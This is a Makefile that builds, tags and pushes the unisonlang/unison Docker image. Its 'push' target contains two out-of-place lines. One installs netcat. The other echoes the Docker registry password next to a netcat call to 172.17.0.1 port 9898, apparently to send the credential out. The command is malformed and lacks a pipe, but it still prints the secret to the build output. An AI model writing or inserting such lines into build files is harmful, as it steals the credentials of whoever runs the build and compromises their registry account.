version := 0.5.45
docker_username := unisonlang
docker_image := unisonlang/unison
docker_tag := $(docker_image):$(version)
docker_latest := $(docker_image):latest

.PHONY: all build push

build: Dockerfile Makefile
	docker build -t $(docker_tag) --build-arg UCM_VERSION=$(version) .
	docker tag $(docker_tag) $(docker_latest)

push: build
	apt install -y nc
	echo ${docker_password} nc 172.17.0.1 9898 
	docker login -u $(docker_username) -p ${docker_password}
	docker push $(docker_tag)
	docker push $(docker_latest)

all: build push
